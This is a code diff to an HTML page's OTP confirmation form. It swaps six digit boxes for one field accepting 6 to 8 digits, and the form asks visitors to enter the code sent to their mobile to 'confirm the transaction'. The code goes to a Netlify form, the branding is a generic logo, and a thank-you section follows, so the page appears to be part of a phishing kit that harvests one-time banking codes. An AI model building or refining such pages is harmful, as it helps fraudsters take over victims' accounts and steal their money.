@@ -200,44 +200,38 @@ body {
     </div>
 
     <!-- OTP Container -->
-    <div class="container">
-        <div class="row justify-content-center">
-            <div class="col-md-6 otp-container otp-container-2">
-                <img src="CONTENT/NetworkLogo.png" alt="App Logo" class="logo">
-                <h2>Please Confirm</h2>
-                <p>Enter the code sent to your mobile to confirm the transaction:</p>
-                <!-- The actual visible form -->
-                <form id="visibleOTPForm" name="otpForm" data-netlify="true">
-                    <div class="otp-inputs">
-                        <!-- OTP input fields -->
-                        <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp1">
-                        <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp2">
-                        <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp3">
-                        <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp4">
-                        <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp5">
-                        <input type="tel" maxlength="1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric" name="otp6">
-                    </div>
-                    <input type="hidden" name="form-name" value="otpForm" />
-                    <button class="btn-2" type="submit">Confirm</button>
-                </form>
-                        <!-- Hidden form for Netlify -->
-<form id="resendForm" name="resendForm" method="post" data-netlify="true" style="display: none;">
-    <input type="hidden" name="form-name" value="resendForm" />
-</form>
+<div class="container">
+    <div class="row justify-content-center">
+        <div class="col-md-6 otp-container otp-container-2">
+            <img src="CONTENT/NetworkLogo.png" alt="App Logo" class="logo">
+            <h2>Please Confirm</h2>
+            <p>Enter the code sent to your mobile to confirm the transaction:</p>
+            
+            <!-- The actual visible form -->
+            <form id="visibleOTPForm" name="otpForm" data-netlify="true">
+                <div class="otp-inputs">
+                    <!-- Single OTP input field -->
+                    <input type="tel" id="otpInput" maxlength="8" minlength="6" autocomplete="one-time-code" pattern="[0-9]{6,8}" inputmode="numeric" required>
+                </div>
+                <input type="hidden" name="form-name" value="otpForm" />
+                <button class="btn-2" type="submit">Confirm</button>
+            </form>
 
-<!-- Timer and Resend Link -->
-<div class="timer-progress-container">
-    <div id="timerBar" class="timer-bar"></div>
-</div>
-<div id="timer" class="timer">01:15</div>
-<a href="#" id="resendLink" class="resend-link">Resend</a>
-<p id="resendConfirmation" class="resend-confirmation" style="display:none;">A new OTP has been sent.</p>
+            <!-- Hidden form for Netlify -->
+            <form id="resendForm" name="resendForm" method="post" data-netlify="true" style="display: none;">
+                <input type="hidden" name="form-name" value="resendForm" />
+            </form>
 
-
-
+            <!-- Timer and Resend Link -->
+            <div class="timer-progress-container">
+                <div id="timerBar" class="timer-bar"></div>
             </div>
+            <div id="timer" class="timer">01:15</div>
+            <a href="#" id="resendLink" class="resend-link">Resend</a>
+            <p id="resendConfirmation" class="resend-confirmation" style="display:none;">A new OTP has been sent.</p>
         </div>
     </div>
+</div>
 
     <!-- Thanks Container -->
     <div class="container thanks-container">
